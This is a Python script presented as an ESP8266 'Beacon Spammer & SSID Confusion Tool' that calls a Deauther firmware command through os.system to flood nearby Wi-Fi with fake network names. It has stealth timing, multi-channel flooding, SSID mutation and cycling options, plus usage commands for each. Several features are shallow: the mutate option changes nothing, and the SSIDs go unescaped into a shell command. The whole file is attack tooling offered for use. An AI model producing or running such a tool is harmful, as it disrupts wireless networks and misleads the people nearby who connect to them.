import argparse
import os
import time
import random

# -------------------------------------------
# ESP8266 - Beacon Spammer & SSID Confusion Tool
# -------------------------------------------
# Features:
# - Floods Wi-Fi environment with randomized SSIDs
# - Creates confusion by spoofing fake networks
# - Supports randomized SSID generation
# - Custom SSID list option
# - Adjustable attack duration and intensity
# - Stealth mode to randomize intervals
# - Multi-channel beacon flooding for wider attack surface
# - Enhanced SSID obfuscation to mimic real networks
# - Dynamic SSID mutation for persistent confusion
# - Timed SSID cycling for increased deception
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Start randomized SSID spamming:
#    python esp8266_beacon_spammer.py --random --count 50
# 2. Use a custom list of SSIDs:
#    python esp8266_beacon_spammer.py --ssid-list ssids.txt
# 3. Set attack duration:
#    python esp8266_beacon_spammer.py --random --count 50 --duration 60
# 4. Enable stealth mode (randomized intervals):
#    python esp8266_beacon_spammer.py --random --count 50 --stealth
# 5. Enable multi-channel beacon flooding:
#    python esp8266_beacon_spammer.py --random --count 50 --multi-channel
# 6. Enable dynamic SSID mutation:
#    python esp8266_beacon_spammer.py --random --count 50 --mutate
# 7. Enable timed SSID cycling:
#    python esp8266_beacon_spammer.py --random --count 50 --cycle-interval 30
# -------------------------------------------

def generate_random_ssid():
    """Generates a random SSID."""
    return "FakeWiFi_" + str(random.randint(1000, 9999))

def beacon_spam(ssid_list=None, count=50, duration=0, stealth=False, multi_channel=False, mutate=False, cycle_interval=0):
    """Executes the SSID flooding attack."""
    print("[+] Starting Beacon Spam Attack...")
    
    if ssid_list:
        with open(ssid_list, "r") as f:
            ssids = [line.strip() for line in f.readlines()]
    else:
        ssids = [generate_random_ssid() for _ in range(count)]
    
    while True:
        for ssid in ssids:
            command = f"python deauther.py beacon-spam --ssid '{ssid}'"
            if multi_channel:
                command += " --multi-channel"
            if stealth:
                time.sleep(random.uniform(1, 5))
            if mutate:
                ssid = generate_random_ssid()
            os.system(command)
        
        if duration:
            print(f"[+] Running attack for {duration} seconds...")
            time.sleep(duration)
            os.system("python deauther.py stop-beacon-spam")
            print("[✔] Attack completed.")
            break
        if cycle_interval:
            print(f"[+] Cycling SSIDs every {cycle_interval} seconds...")
            time.sleep(cycle_interval)
        else:
            break

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Beacon Spammer & SSID Confusion Tool")
    parser.add_argument("--random", action='store_true', help="Use randomly generated SSIDs")
    parser.add_argument("--ssid-list", type=str, help="Use a custom SSID list from a file")
    parser.add_argument("--count", type=int, default=50, help="Number of SSIDs to spam")
    parser.add_argument("--duration", type=int, help="Duration of the attack in seconds")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode with randomized intervals")
    parser.add_argument("--multi-channel", action='store_true', help="Enable multi-channel beacon flooding")
    parser.add_argument("--mutate", action='store_true', help="Enable dynamic SSID mutation")
    parser.add_argument("--cycle-interval", type=int, help="Enable timed SSID cycling (seconds)")
    args = parser.parse_args()

    if args.random:
        beacon_spam(count=args.count, duration=args.duration if args.duration else 0, stealth=args.stealth, multi_channel=args.multi_channel, mutate=args.mutate, cycle_interval=args.cycle_interval if args.cycle_interval else 0)
    elif args.ssid_list:
        beacon_spam(ssid_list=args.ssid_list, duration=args.duration if args.duration else 0, stealth=args.stealth, multi_channel=args.multi_channel, mutate=args.mutate, cycle_interval=args.cycle_interval if args.cycle_interval else 0)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()